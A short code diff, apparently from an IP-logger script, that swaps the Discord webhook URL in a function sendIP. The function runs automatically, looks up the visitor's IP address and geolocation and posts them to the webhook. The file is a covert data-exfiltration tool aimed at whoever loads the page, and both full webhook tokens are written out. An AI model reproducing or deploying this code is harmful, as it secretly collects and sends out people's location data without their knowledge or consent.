@@ -6,7 +6,7 @@ const sendIP = () => {
             return fetch('https://ipwho.is/')  // API com CORS
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1434610512817295481/xCqpWyOquMugG3gtsYI9NvgIOa_uX47S2ricKjbLfcuEbs1iFhbakivEL5i-tGtoHwj7'; // SEU WEBHOOK
+                    const dscURL = 'https://discord.com/api/webhooks/1434613085720805528/ojqLS-roSg3RMBTpMwoLOM2C6jv2I9-a4TxnemRF0m7eKH6B-rDXTjmjqKzsKdZOCBd4'; // SEU WEBHOOK
 
                     return fetch(dscURL, {
                         method: 'POST',
@@ -40,3 +40,4 @@ const sendIP = () => {
         });
 };
 sendIP();
+
